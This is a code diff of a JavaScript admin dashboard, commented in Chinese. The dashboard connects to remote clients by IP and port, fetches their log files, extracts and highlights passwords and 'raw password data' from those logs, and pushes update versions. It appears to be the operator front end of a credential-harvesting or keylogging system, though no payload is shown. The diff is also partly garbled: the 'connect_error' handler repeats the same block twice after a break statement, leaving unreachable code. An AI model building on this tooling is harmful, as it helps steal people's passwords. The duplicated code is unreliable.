@@ -10,13 +10,27 @@ let isReconnecting = false;
 let reconnectAttempts = 0;
 let connectingClients = new Set();
 let currentExtractedPasswords = [];
+let lastExtractedPasswords = null;
+// 提取结果分页相关
+let extractedPage = 1;                // 当前页码
+const EXTRACT_PAGE_SIZE = 50;         // 每页条数
+let extractedSearchKeyword = '';
+// 日志分页相关
+let currentLogContent = '';             // 当前查看的完整日志文本
+let currentLogPage = 1;                 // 当前页码
+const LOG_PAGE_SIZE = 500;              // 每页行数
+let currentLogHighlightPassword = '';   // 需要高亮的密码（可选）
+let currentLogHighlightRaw = '';        // 原始密码高亮（可选）
+let currentLogScrollTarget = '';        // 需要滚动到的目标文本
+let currentLogClientId = '';
+let currentLogFilename = ''; 
 let blacklistPage = 1;
 let blacklistPageSize = 20;
 let blacklistTotalPages = 1;
 const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}`;
 let autoRefreshTimer = null;
-const AUTO_REFRESH_INTERVAL = 30000; 
 const MAX_RECONNECT_DELAY = 30000;
+const AUTO_REFRESH_INTERVAL = 2500;
 
 // Alist 配置
 let ALIST_BASE_URL = '';
@@ -107,6 +121,7 @@ function connectWebSocket() {
     }
 
     ws = new WebSocket(WS_URL);
+
     ws.onopen = () => {
         dom.wsStatus.classList.add('connected');
         dom.wsStatusText.textContent = '已连接';
@@ -122,9 +137,10 @@ function connectWebSocket() {
         showToast(wasReconnect ? '已重新连接到服务器' : '已连接到服务器', 'success');
     };
 
-    ws.onclose = (event) => {
+        ws.onclose = (event) => {
         dom.wsStatus.classList.remove('connected');
         dom.wsStatusText.textContent = '已断开';
+        
         // 完全清理 WebSocket 状态
         if (ws) {
             ws.onopen = null;
@@ -138,7 +154,7 @@ function connectWebSocket() {
         if (isUnloading) return;
 
         if (event && event.code === 1008) {
-            dom.wsStatusText.textContent = '未授权，连接已关闭';
+            dom.wsStatusText.textContent = '未授权';
             showToast('WebSocket 未授权，请重新登录', 'error');
             return;
         }
@@ -147,6 +163,12 @@ function connectWebSocket() {
             showToast('与服务器断开，正在重连...', 'error');
         }
         isReconnecting = true;
+        dom.wsStatusText.textContent = '重连中...';
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+
         reconnectTimer = setTimeout(() => {
             reconnectAttempts += 1;
             connectWebSocket();
@@ -227,19 +249,48 @@ function handleWebSocketMessage(data) {
             dom.scanProgress.classList.remove('show');
             showToast('扫描失败: ' + data.message, 'error');
             break;
+        
         case 'connect_result':
             if (data.client) {
-                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
-                hideModal('connectModal');
-                // 移除连接中标记
+                // 清理超时定时器（如果存在）
+                if (window.connectTimeouts && window.connectTimeouts.has(data.client.id)) {
+                    clearTimeout(window.connectTimeouts.get(data.client.id));
+                    window.connectTimeouts.delete(data.client.id);
+                }
                 connectingClients.delete(data.client.id);
                 renderClientsTable();
+                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
             } else {
-                showToast('连接失败：服务器无响应', 'error');//直接刷新列表
+                showToast('连接失败：服务器无响应', 'error');
             }
             break;
+
         case 'connect_error':
             if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
+                connectingClients.delete(data.clientId);
+                renderClientsTable();
+            }
+            showToast('连接失败: ' + (data.message || '未知错误'), 'error');
+            break;
+            if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
+                connectingClients.delete(data.clientId);
+                renderClientsTable();
+            }
+            showToast('连接失败: ' + (data.message || '未知错误'), 'error');
+            break;
+            if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
                 connectingClients.delete(data.clientId);
                 renderClientsTable();
             }
@@ -424,7 +475,8 @@ async function loadClientLogs(clientId) {
     if (!client) return;
 
     try {
-        const response = await fetch(`/api/clients/${clientId}/logs`);
+        // 强制刷新避免缓存
+        const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
         const logs = await response.json();
         if (logs.length === 0) {
             document.getElementById('clientLogs').innerHTML = '<p>暂无日志文件</p>';
@@ -516,35 +568,60 @@ function deleteClient(clientId) {
 }
 
 // 手动连接（模态框调用）
+// 文件: app.js
+// 替换原有的 manualConnect 函数
+
 function manualConnect() {
-    const ip = document.getElementById('connectIp').value;
+    const ip = document.getElementById('connectIp').value.trim();
     const port = parseInt(document.getElementById('connectPort').value);
     if (!ip || !port) {
         showToast('请填写 IP 和端口', 'error');
         return;
     }
-    ws.send(JSON.stringify({
-        type: 'manual_connect',
-        ip, port
-    }));
-}
-
-// 连接单个客户端（供按钮调用）
-function connectClient(ip, port, clientId) {
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        showToast('WebSocket 未连接', 'error');
-        return;
-    }
-    // 添加到连接中集合
-    connectingClients.add(clientId);
-    // 重新渲染表格以显示连接中状态
-    renderClientsTable();
+    // 关闭模态框
+    hideModal('connectModal');
+    // 清空输入
+    document.getElementById('connectIp').value = '';
+    document.getElementById('connectPort').value = '9999';
+    
     ws.send(JSON.stringify({
         type: 'manual_connect',
         ip,
         port
     }));
     showToast(`正在尝试连接 ${ip}:${port}...`, 'success');
+}
+
+function connectClient(ip, port, clientId) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+        showToast('WebSocket 未连接', 'error');
+        return;
+    }
+    
+    // 添加连接中标记
+    connectingClients.add(clientId);
+    renderClientsTable();
+    
+    // 即时反馈
+    showToast(`正在连接 ${ip}:${port}...`, 'success');
+    
+    // 设置超时定时器（10秒）
+    const timeoutId = setTimeout(() => {
+        if (connectingClients.has(clientId)) {
+            connectingClients.delete(clientId);
+            renderClientsTable();
+            showToast(`连接 ${ip}:${port} 超时`, 'error');
+        }
+    }, 10000);
+    
+    ws.send(JSON.stringify({
+        type: 'manual_connect',
+        ip,
+        port
+    }));
+    
+    if (!window.connectTimeouts) window.connectTimeouts = new Map();
+    window.connectTimeouts.set(clientId, timeoutId);
 }
 
 // 一键连接全部离线客户端
@@ -583,12 +660,13 @@ async function refreshLogs() {
     const clientId = dom.logClientSelect.value;
     try {
         let logs, fetchClientId;
+        // 请求带上 refresh=true，强制后端绕过 Alist 缓存
         if (clientId) {
-            const response = await fetch(`/api/clients/${clientId}/logs`);
+            const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
             logs = await response.json();
             fetchClientId = clientId;
         } else {
-            const response = await fetch('/api/logs');
+            const response = await fetch('/api/logs?refresh=true');
             logs = await response.json();
             fetchClientId = null;
         }
@@ -642,13 +720,37 @@ function renderLogsTable(logs, clientId) {
     dom.logsTable.innerHTML = html;
 }
 
-// 查看日志内容
-async function viewLog(clientId, filename) {
+async function viewLog(clientId, filename, options = {}) {
+     const { password = '', rawPassword = '' } = options;  // 解构参数
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
         const content = await response.text();
+
+        // 保存全局状态
+        currentLogContent = content;
+        currentLogClientId = clientId;
+        currentLogFilename = filename;
+        currentLogHighlightPassword = options.password || '';
+        currentLogHighlightRaw = options.rawPassword || '';
+        currentLogScrollTarget = options.rawPassword || options.password || '';
+
+        // 自动定位到包含高亮词的页码
+        if (currentLogScrollTarget) {
+            const index = content.indexOf(currentLogScrollTarget);
+            if (index !== -1) {
+                // 找到目标字符所在行数
+                const before = content.substring(0, index);
+                const lineNumber = before.split('\n').length;
+                currentLogPage = Math.ceil(lineNumber / LOG_PAGE_SIZE);
+            } else {
+                currentLogPage = 1;
+            }
+        } else {
+            currentLogPage = 1;
+        }
+
         document.getElementById('logModalTitle').textContent = filename;
-        document.getElementById('logContent').textContent = content;
+        renderLogPage();
         document.getElementById('logModal').classList.add('show');
     } catch (e) {
         console.error('查看日志失败:', e);
@@ -657,29 +759,7 @@ async function viewLog(clientId, filename) {
 }
 
 // 查看日志内容并滚动到包含原始密码数据的行
-async function viewLogWithPassword(clientId, filename, password, rawPassword) {
-    try {
-        // 1. 获取日志内容
-        const content = await fetchLogContent(clientId, filename);
-        
-        // 2. 更新标题
-        document.getElementById('logModalTitle').textContent = filename;
-        
-        // 3. 生成高亮内容
-        const highlightedContent = generateHighlightedContent(content, password, rawPassword);
-        
-        // 4. 更新 DOM
-        document.getElementById('logContent').innerHTML = highlightedContent;
-        document.getElementById('logModal').classList.add('show');
-        
-        // 5. 滚动到高亮位置
-        scrollToHighlight(rawPassword);
-        
-    } catch (e) {
-        console.error('查看日志失败:', e);
-        showToast('查看失败，文件可能不存在或已被删除', 'error');
-    }
-}
+
 
 // 添加闪烁效果
 function addBlinkEffect(element) {
@@ -805,10 +885,7 @@ function downloadLog(clientId, filename) {
 
 // 删除日志
 async function deleteLog(clientId, filename) {
-    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) {
-        return;
-    }
-
+    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) return;
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}`, {
             method: 'DELETE'
@@ -816,12 +893,10 @@ async function deleteLog(clientId, filename) {
         const result = await response.json();
         if (response.ok) {
             showToast(`日志 ${filename} 已删除`, 'success');
-            // 刷新当前显示的日志列表
+            // 立即刷新相关列表
+            refreshLogs();
             if (currentClientId === clientId && document.getElementById('clientModal').classList.contains('show')) {
                 loadClientLogs(clientId);
-            }
-            if (dom.logClientSelect.value === clientId) {
-                refreshLogs();
             }
         } else {
             showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
@@ -992,6 +1067,9 @@ function stopAutoRefresh() {
 }
 
 // 提取密码
+// 文件: app.js
+// 替换原有的 extractPasswords 函数
+
 async function extractPasswords() {
     try {
         showToast('正在提取密码...', 'success');
@@ -1000,7 +1078,11 @@ async function extractPasswords() {
         });
         const result = await response.json();
         if (result.success) {
-            showToast(`成功提取 ${result.count} 个密码，已保存到 extracted_passwords.txt`, 'success');
+            showToast(`成功提取 ${result.count} 个密码`, 'success');
+            // 保存并直接展示
+            lastExtractedPasswords = result.passwords;
+            displayExtractedPasswords(result.passwords);
+            document.getElementById('extractModal').classList.add('show');
         } else {
             showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
         }
@@ -1012,46 +1094,32 @@ async function extractPasswords() {
 
 // 查看密码提取结果
 async function viewLatestPasswords() {
+    if (lastExtractedPasswords && lastExtractedPasswords.length > 0) {
+        displayExtractedPasswords(lastExtractedPasswords);
+        document.getElementById('extractModal').classList.add('show');
+        return;
+    }
     try {
-        // 直接从服务器本地读取提取结果文件
         const response = await fetch('/api/extract-passwords/view');
-        console.log('查看提取结果响应状态:', response.status);
-        if (response.ok) {
-            const content = await response.text();
-            console.log('提取结果内容长度:', content.length);
-            
-            // 解析提取结果
-            let passwords = parseExtractedPasswords(content);
-            
-            // 获取黑名单并过滤当前提取结果
-            try {
-                // 获取全部黑名单（不分页），确保过滤完整
-                const blacklistResponse = await fetch('/api/blacklist?page=1&limit=10000');
-                if (blacklistResponse.ok) {
-                    const data = await blacklistResponse.json();
-                    const blacklistSet = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
-                    passwords = passwords.filter(item => !blacklistSet.has(normalizePassword(item.password)));
-                }
-            } catch (e) {
-                console.warn('获取黑名单失败，继续显示提取结果', e);
+        if (!response.ok) throw new Error('结果文件不存在');
+        const content = await response.text();
+        let passwords = parseExtractedPasswords(content);
+        // 实时过滤黑名单
+        try {
+            const blacklistResp = await fetch('/api/blacklist?page=1&limit=10000');
+            if (blacklistResp.ok) {
+                const data = await blacklistResp.json();
+                const set = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
+                passwords = passwords.filter(item => !set.has(normalizePassword(item.password)));
             }
-            
-            // 显示提取结果
-            displayExtractedPasswords(passwords);
-            
-            // 显示模态框
-            document.getElementById('extractModal').classList.add('show');
-        } else {
-            const errorText = await response.text();
-            console.error('查看提取结果失败:', errorText);
-            showToast(`查看失败: ${errorText}`, 'error');
-        }
+        } catch (e) { console.warn('过滤黑名单失败'); }
+        displayExtractedPasswords(passwords);
+        document.getElementById('extractModal').classList.add('show');
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
         showToast('查看失败，可能还没有提取过密码', 'error');
     }
 }
-
 // 解析提取的密码）
 function parseExtractedPasswords(content) {
     const passwords = [];
@@ -1097,112 +1165,109 @@ function parseExtractedPasswords(content) {
     return passwords;
 }
 
-// 显示提取的密码
-function displayExtractedPasswords(passwords) {
-    const extractList = document.getElementById('extractList');
-    const extractStats = document.getElementById('extractStats');
+function renderLogPage() {
+    const logContentEl = document.getElementById('logContent');
+    const pagerEl = document.getElementById('logPager');
     
-    // 更新统计信息
-    extractStats.textContent = `共 ${passwords.length} 个密码`;
+    if (!currentLogContent) return;
     
-    if (passwords.length === 0) {
-        extractList.innerHTML = `
-            <div class="extract-empty">
-                <i class="fas fa-key"></i>
-                <p>暂无提取的密码</p>
-            </div>
-        `;
-        return;
+    const lines = currentLogContent.split('\n');
+    const totalLines = lines.length;
+    const maxPage = Math.ceil(totalLines / LOG_PAGE_SIZE) || 1;
+    
+    if (currentLogPage > maxPage) currentLogPage = maxPage;
+    if (currentLogPage < 1) currentLogPage = 1;
+    
+    const start = (currentLogPage - 1) * LOG_PAGE_SIZE;
+    const end = Math.min(start + LOG_PAGE_SIZE, totalLines);
+    const pageLines = lines.slice(start, end);
+    
+    // 先转义整行，防止 XSS
+    let processedLines = pageLines.map(line => escapeHtml(line));
+    
+    // 再高亮（搜索词也需要转义）
+    if (currentLogHighlightRaw) {
+        const escapedRaw = escapeHtml(currentLogHighlightRaw);
+        processedLines = processedLines.map(line => 
+            line.replace(new RegExp(escapeRegexSpecialChars(escapedRaw), 'g'), 
+                         `<span class="raw-password-highlight">${escapedRaw}</span>`)
+        );
+    }
+    if (currentLogHighlightPassword && currentLogHighlightPassword !== currentLogHighlightRaw) {
+        const escapedPwd = escapeHtml(currentLogHighlightPassword);
+        processedLines = processedLines.map(line => 
+            line.replace(new RegExp(escapeRegexSpecialChars(escapedPwd), 'g'), 
+                         `<span class="password-highlight">${escapedPwd}</span>`)
+        );
     }
     
-    // 生成密码列表
-    let html = '';
-    passwords.forEach((item, index) => {
-        // 提取客户端ID和文件名
-        let clientId = '';
-        let filename = item.file;
-        
-        // 尝试从文件名中提取客户端ID
-        const ipMatch = item.file.match(/^(\d+\.\d+\.\d+\.\d+)_/);
-        if (ipMatch) {
-            const ip = ipMatch[1];
-            const client = clients.find(c => c.ip === ip);
-            clientId = client ? client.id : `${ip}:9999`;
-        }
-        
-        // 为每个项目添加唯一标识符
-        const itemId = `password-item-${index}`;
-        
-        html += `
-            <div class="extract-item" id="${itemId}">
-                <div class="index">${item.index}</div>
-                <div class="password-content">
-                    ${escapeHtml(item.password)}
-                    ${item.rawPassword ? `
-                        <div class="raw-password" style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
-                            <span style="font-weight: 600;">原始数据:</span> ${escapeHtml(item.rawPassword)}
-                        </div>
-                    ` : ''}
-                </div>
-                <div class="source-file">
-                    <a href="javascript:void(0)" class="source-file-link" data-client-id="${escapeHtml(clientId)}" data-filename="${escapeHtml(filename)}" data-password="${escapeHtml(item.password)}" data-raw-password="${escapeHtml(item.rawPassword || '')}" style="color: var(--primary); text-decoration: underline; cursor: pointer;">
-                        ${escapeHtml(item.file)}
-                    </a>
-                </div>
-                <div class="action-cell">
-                    <button class="btn btn-sm btn-secondary blacklist-password-btn" data-index="${index}" style="padding: 0.35rem 0.75rem; min-width: 110px;">
-                        不再显示
-                    </button>
-                </div>
-                <div class="timestamp">${escapeHtml(item.timestamp)}</div>
-            </div>
-        `;
-    });
+    logContentEl.innerHTML = processedLines.join('\n');
     
-    currentExtractedPasswords = passwords;
-    extractList.innerHTML = html;
-    
-    // 添加点击事件处理程序
-    extractList.onclick = async function(e) {
-        const link = e.target.closest('.source-file-link');
-        if (link) {
-            const clientId = link.dataset.clientId;
-            const filename = link.dataset.filename;
-            const password = link.dataset.password;
-            const rawPassword = link.dataset.rawPassword;
-            viewLogWithPassword(clientId, filename, password, rawPassword);
-            return;
+    // 更新分页控件
+    if (pagerEl) {
+        if (maxPage <= 1) {
+            pagerEl.innerHTML = '';
+        } else {
+            pagerEl.innerHTML = `
+                <button class="btn btn-sm btn-secondary" ${currentLogPage === 1 ? 'disabled' : ''}
+                        onclick="changeLogPage(-1)">
+                    <i class="fas fa-chevron-left"></i> 上一页
+                </button>
+                <span style="margin: 0 1rem; color: var(--gray);">
+                    第 ${currentLogPage} 页 / ${maxPage} 页 (共 ${totalLines} 行)
+                </span>
+                <button class="btn btn-sm btn-secondary" ${currentLogPage === maxPage ? 'disabled' : ''}
+                        onclick="changeLogPage(1)">
+                    下一页 <i class="fas fa-chevron-right"></i>
+                </button>
+            `;
         }
-
-        const button = e.target.closest('.blacklist-password-btn');
-        if (button) {
-            const index = Number(button.dataset.index);
-            const itemElement = button.closest('.extract-item');
-            const password = currentExtractedPasswords[index] ? currentExtractedPasswords[index].password : '';
-            await blacklistExtractedPassword(itemElement, password);
-        }
-    };
-    
-    // 添加搜索功能
-    const searchInput = document.getElementById('extractSearch');
-    searchInput.oninput = function() {
-        const searchTerm = this.value.toLowerCase();
-        const items = extractList.querySelectorAll('.extract-item');
-        
-        items.forEach(item => {
-            const password = item.querySelector('.password-content').textContent.toLowerCase();
-            const file = item.querySelector('.source-file').textContent.toLowerCase();
-            
-            if (password.includes(searchTerm) || file.includes(searchTerm)) {
-                item.style.display = '';
-            } else {
-                item.style.display = 'none';
+    }
+    if (currentLogScrollTarget) {
+        setTimeout(() => {
+            const highlight = document.querySelector('.raw-password-highlight') 
+                           || document.querySelector('.password-highlight');
+            if (highlight) {
+                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                // 闪烁效果
+                highlight.classList.add('blink');
+                setTimeout(() => highlight.classList.remove('blink'), 2000);
             }
-        });
-    };
+        }, 100);
+    }
 }
 
-async function blacklistExtractedPassword(itemElement, password) {
+function changeLogPage(delta) {
+    const lines = currentLogContent.split('\n');
+    const maxPage = Math.ceil(lines.length / LOG_PAGE_SIZE) || 1;
+    const newPage = currentLogPage + delta;
+
+    if (newPage < 1 || newPage > maxPage) return;
+    currentLogPage = newPage;
+    renderLogPage();
+}
+
+// 显示提取的密码
+function displayExtractedPasswords(passwords) {
+    currentExtractedPasswords = passwords;   // 保存全量数据
+    extractedSearchKeyword = '';             // 重置搜索
+    extractedPage = 1;                       // 回到第一页
+
+    // 设置搜索事件（仅绑定一次）
+    const searchInput = document.getElementById('extractSearch');
+    if (searchInput) {
+        searchInput.value = '';
+        searchInput.oninput = function() {
+            extractedSearchKeyword = this.value.toLowerCase();
+            extractedPage = 1;               // 搜索后回到第一页
+            renderExtractedPage();
+        };
+    }
+
+    renderExtractedPage();
+}
+
+async function blacklistExtractedPassword(password) {
     if (!password) {
         showToast('无法加入黑名单：密码内容为空', 'error');
         return;
@@ -1211,9 +1276,7 @@ async function blacklistExtractedPassword(itemElement, password) {
     try {
         const response = await fetch('/api/blacklist', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ password })
         });
 
@@ -1222,14 +1285,26 @@ async function blacklistExtractedPassword(itemElement, password) {
             throw new Error(error.error || '加入黑名单失败');
         }
 
-        if (itemElement) {
-            itemElement.remove();
-            currentExtractedPasswords = currentExtractedPasswords.filter(item => normalizePassword(item.password) !== normalizePassword(password));
-            const extractStats = document.getElementById('extractStats');
-            const currentCount = parseInt(extractStats.textContent.replace(/\D/g, '')) || 0;
-            extractStats.textContent = `共 ${Math.max(currentCount - 1, 0)} 个密码`;
+        // 从全量数组中移除
+        currentExtractedPasswords = currentExtractedPasswords.filter(
+            item => normalizePassword(item.password) !== normalizePassword(password)
+        );
+
+        // 如果当前页没有数据了，自动回退一页
+        let filtered = currentExtractedPasswords;
+        if (extractedSearchKeyword) {
+            filtered = filtered.filter(item =>
+                (item.password && item.password.toLowerCase().includes(extractedSearchKeyword)) ||
+                (item.file && item.file.toLowerCase().includes(extractedSearchKeyword))
+            );
+        }
+        const total = filtered.length;
+        const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;
+        if (extractedPage > maxPage && maxPage > 0) {
+            extractedPage = maxPage;
         }
 
+        renderExtractedPage();
         showToast('已加入黑名单，后续提取时将跳过该密码', 'success');
     } catch (e) {
         console.error('加入黑名单失败:', e);
@@ -1249,6 +1324,149 @@ window.addEventListener('beforeunload', () => {
         ws.close();
     }
 });
+
+function renderExtractedPage() {
+    const listEl = document.getElementById('extractList');
+    const statsEl = document.getElementById('extractStats');
+    const pagerEl = document.getElementById('extractPager'); // 需在 HTML 中添加
+
+    // 1. 根据搜索关键词过滤全量数据
+    let filtered = currentExtractedPasswords;
+    if (extractedSearchKeyword) {
+        filtered = filtered.filter(item =>
+            (item.password && item.password.toLowerCase().includes(extractedSearchKeyword)) ||
+            (item.file && item.file.toLowerCase().includes(extractedSearchKeyword))
+        );
+    }
+
+    const total = filtered.length;
+    const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;
+
+    // 页码越界保护
+    if (extractedPage > maxPage) extractedPage = maxPage;
+    if (extractedPage < 1) extractedPage = 1;
+
+    const start = (extractedPage - 1) * EXTRACT_PAGE_SIZE;
+    const pageItems = filtered.slice(start, start + EXTRACT_PAGE_SIZE);
+
+    // 2. 更新统计信息
+    statsEl.textContent = `共 ${total} 个密码`;
+
+    // 3. 渲染列表
+    if (pageItems.length === 0) {
+        listEl.innerHTML = `
+            <div class="extract-empty">
+                <i class="fas fa-key"></i>
+                <p>暂无提取的密码</p>
+            </div>
+        `;
+    } else {
+        let html = '';
+        pageItems.forEach((item) => {
+            // 此处的 index 是过滤后数组中的下标，需要找到原始全局索引
+            const globalIndex = currentExtractedPasswords.indexOf(item);
+
+            let clientId = '';
+            let filename = item.file;
+            const ipMatch = item.file.match(/^(\d+\.\d+\.\d+\.\d+)_/);
+            if (ipMatch) {
+                const ip = ipMatch[1];
+                const client = clients.find(c => c.ip === ip);
+                clientId = client ? client.id : `${ip}:9999`;
+            }
+
+            html += `
+            <div class="extract-item">
+                <div class="index">${item.index}</div>
+                <div class="password-content">
+                    ${escapeHtml(item.password)}
+                    ${item.rawPassword ? `
+                        <div class="raw-password" style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
+                            <span style="font-weight: 600;">原始数据:</span> ${escapeHtml(item.rawPassword)}
+                        </div>
+                    ` : ''}
+                </div>
+                <div class="source-file">
+                    <a href="javascript:void(0)" class="source-file-link"
+                       data-client-id="${escapeHtml(clientId)}"
+                       data-filename="${escapeHtml(filename)}"
+                       data-password="${escapeHtml(item.password)}"
+                       data-raw-password="${escapeHtml(item.rawPassword || '')}"
+                       style="color: var(--primary); text-decoration: underline; cursor: pointer;">
+                        ${escapeHtml(item.file)}
+                    </a>
+                </div>
+                <div class="action-cell">
+                    <button class="btn btn-sm btn-secondary blacklist-password-btn"
+                            data-global-index="${globalIndex}"
+                            style="padding: 0.35rem 0.75rem; min-width: 110px;">
+                        不再显示
+                    </button>
+                </div>
+                <div class="timestamp">${escapeHtml(item.timestamp)}</div>
+            </div>
+            `;
+        });
+        listEl.innerHTML = html;
+    }
+
+    // 4. 更新分页控件
+    if (pagerEl) {
+        if (maxPage <= 1) {
+            pagerEl.innerHTML = '';
+        } else {
+            pagerEl.innerHTML = `
+                <button class="btn btn-sm btn-secondary" ${extractedPage === 1 ? 'disabled' : ''}
+                        onclick="changeExtractedPage(-1)">
+                    <i class="fas fa-chevron-left"></i> 上一页
+                </button>
+                <span style="margin: 0 1rem; color: var(--gray);">第 ${extractedPage} 页 / ${maxPage} 页</span>
+                <button class="btn btn-sm btn-secondary" ${extractedPage === maxPage ? 'disabled' : ''}
+                        onclick="changeExtractedPage(1)">
+                    下一页 <i class="fas fa-chevron-right"></i>
+                </button>
+            `;
+        }
+    }
+
+    // 5. 委托事件（覆盖式绑定，只处理当前 DOM 中的按钮）
+    listEl.onclick = async function(e) {
+        // 点击文件名查看日志
+        const link = e.target.closest('.source-file-link');
+        if (link) {
+            const cId = link.dataset.clientId;
+            const fname = link.dataset.filename;
+            const pwd = link.dataset.password;
+            const raw = link.dataset.rawPassword;
+            viewLog(cId, fname, { password: pwd, rawPassword: raw });
+            return;
+        }
+
+        // 点击“不再显示”
+        const btn = e.target.closest('.blacklist-password-btn');
+        if (btn) {
+            const gIdx = parseInt(btn.dataset.globalIndex, 10);
+            const password = currentExtractedPasswords[gIdx]?.password;
+            if (password) {
+                await blacklistExtractedPassword(password);
+            }
+        }
+    };
+}
+
+function changeExtractedPage(delta) {
+    const total = currentExtractedPasswords.filter(item => {
+        if (!extractedSearchKeyword) return true;
+        return (item.password && item.password.toLowerCase().includes(extractedSearchKeyword)) ||
+               (item.file && item.file.toLowerCase().includes(extractedSearchKeyword));
+    }).length;
+    const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;
+    const newPage = extractedPage + delta;
+
+    if (newPage < 1 || newPage > maxPage) return;
+    extractedPage = newPage;
+    renderExtractedPage();
+}
 
 // 退出登录
 function logout() {
@@ -1414,17 +1632,18 @@ async function loadVersions() {
 // 渲染版本表格
 function renderVersionsTable(versions) {
     const container = document.getElementById('versionsTable');
-    
+
     if (!versions || versions.length === 0) {
         container.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--gray);">暂无版本信息 - 点击"刷新版本"从Alist获取</div>';
         return;
     }
-    
+
     let html = `
         <table class="table">
             <thead>
                 <tr>
                     <th>版本号</th>
+                    <th>激活状态</th>
                     <th>下载链接</th>
                     <th>文件名</th>
                     <th style="width: 200px;">操作</th>
@@ -1432,31 +1651,52 @@ function renderVersionsTable(versions) {
             </thead>
             <tbody>
     `;
-    
+
     versions.forEach(version => {
+        const isActive = version.is_active;
+        // 定义激活状态的徽章
+        const activeBadge = isActive
+            ? '<span class="status-badge status-online" style="font-weight:600;">已激活</span>'
+            : '<span class="status-badge status-offline">未激活</span>';
+
+        // 已激活的版本只显示取消激活按钮，未激活的显示“设为激活”按钮
+        const actionBtn = isActive
+            ? `<div>
+                <button class="btn btn-sm btn-warning" onclick="deactivateVersion()">取消激活</button>
+               </div>`
+            : `<button class="btn btn-sm btn-primary" onclick="setActiveVersion('${escapeHtml(version.version)}')">设为激活</button>`;
+
         html += `
             <tr>
                 <td><strong>${escapeHtml(version.version)}</strong></td>
+                <td>${activeBadge}</td>
                 <td><small><a href="${escapeHtml(version.downloadUrl)}" target="_blank" class="link" title="${escapeHtml(version.downloadUrl)}">${escapeHtml(version.downloadUrl.substring(0, 40))}...</a></small></td>
                 <td><small>${escapeHtml(version.filename)}</small></td>
-                <td>
-                    <button class="btn btn-sm btn-primary" onclick="setActiveVersion('${escapeHtml(version.version)}')">
-                        <i class="fas fa-check"></i> 设为激活
-                    </button>
-                </td>
+                <td>${actionBtn}</td>
             </tr>
         `;
     });
-    
-    html += `
-            </tbody>
-        </table>
-    `;
-    
+
+    html += `</tbody></table>`;
     container.innerHTML = html;
 }
 
-
+// 前端调用函数
+async function deactivateVersion() {
+    if (!confirm('确定要取消当前激活的版本吗？')) return;
+    try {
+        const response = await fetch('/api/update/deactivate', { method: 'POST' });
+        const data = await response.json();
+        if (data.code === 200) {
+            showToast('已取消激活', 'success');
+            loadVersions();
+        } else {
+            showToast(data.message || '取消激活失败', 'error');
+        }
+    } catch (error) {
+        showToast('取消激活请求失败', 'error');
+    }
+}
 
 // 设置激活版本
 async function setActiveVersion(version) {
